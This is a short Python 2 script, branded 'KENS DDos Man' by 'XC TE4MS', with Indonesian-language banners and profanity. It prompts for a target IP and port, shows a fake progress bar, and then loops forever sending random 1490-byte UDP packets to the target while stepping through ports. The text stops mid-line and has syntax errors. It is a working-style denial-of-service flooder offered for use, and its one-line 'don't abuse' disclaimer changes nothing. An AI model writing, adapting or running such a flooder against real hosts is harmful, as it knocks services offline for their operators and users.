import sys
import os
import time
import socket
import random
#Code wkakak
from datetime import datetime
now = datetime.now()
minute = now.minute
hour = now.hour
day = now.day
month = now.month
year = now.year

#########################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
########################

os.system("clear")
os.system("figlet KENS DDos Man")
print
print ("Author    :--  KensXc") 
print ("Team  :--- XC  TE4MS") 
print ("XC TE4MS  :----Dont Abuse This Fuckin' TOOLS! ") 
print
ip = raw_input("IPnya BANJI: ")
port = input("Masukin PORT: ")

os.system("clear")
os.system("figlet SABAR BEGO LAGI DIKIRIM! ")
print ("[+]-                                [+] 0%") 
time.sleep(2)
print ("[+]-xxxx>                           [+] 20%") 
time.sleep(2)
print ("[+]-xxxxxxxx>                       [+] 40%") 
time.sleep(3)
print ("[+]-xxxxxxxxxxxxx>                  [+] 60%") 
time.sleep(3)
print ("[+]-xxxxxxxxxxxxxxxxxxx>            [+] 80%") 
time.sleep(2)
print ("[+]-xxxxxxxxxxxxxxxxxxxxxxxxxxx>    [+] 100%") 
time.sleep(2)
sent = 0
while True:
  sock.sendto(bytes, (ip,port))
  sent = sent + 1
  port = port + 1
  print ("XC TE4MS :-sent %s packet to %s through port :%s"%(sent,ip,port)
  if port == 65534